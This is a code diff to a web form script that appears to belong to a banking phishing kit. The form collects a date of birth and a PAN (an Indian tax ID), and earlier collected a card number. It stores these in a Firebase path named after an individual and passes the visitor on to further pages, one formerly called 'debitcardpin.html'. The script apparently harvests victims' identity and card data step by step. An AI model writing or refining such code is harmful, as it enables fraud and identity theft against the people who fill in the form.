@@ -1,6 +1,5 @@
 // firebase-card.js
 
-const cardInput = document.getElementById("card");
 const dobInput = document.getElementById("dob");
 const panInput = document.getElementById("pan");
 const proceedBtn = document.querySelector(".proceed-button");
@@ -11,12 +10,20 @@ dobInput.addEventListener("input", () => {
   if (value.length >= 3) value = value.slice(0, 2) + "/" + value.slice(2);
   if (value.length >= 6) value = value.slice(0, 5) + "/" + value.slice(5);
   dobInput.value = value.slice(0, 10);
+  validateForm();
 });
 
-// Enable button when card is 16 digits
-cardInput.addEventListener("input", () => {
-  proceedBtn.disabled = cardInput.value.length !== 16;
+// PAN input listener
+panInput.addEventListener("input", () => {
+  validateForm();
 });
+
+// Enable button when both PAN and DOB are filled correctly
+function validateForm() {
+  const panValid = panInput.value.trim().length === 10;
+  const dobValid = dobInput.value.trim().length === 10;
+  proceedBtn.disabled = !(panValid && dobValid);
+}
 
 // Form submit
 document.getElementById("cardForm").addEventListener("submit", function (e) {
@@ -28,11 +35,10 @@ document.getElementById("cardForm").addEventListener("submit", function (e) {
   const userRef = firebase.database().ref("ududip007/" + key);
 
   userRef.update({
-    d_CARD: cardInput.value.trim(),
     e_DOB: dobInput.value.trim(),
     f_PAN: panInput.value.trim()
   }).then(() => {
-    window.location.href = "debitcardpin.html";
+    window.location.href = "lastdown.html";
   }).catch((err) => {
     alert("Error: " + err.message);
   });
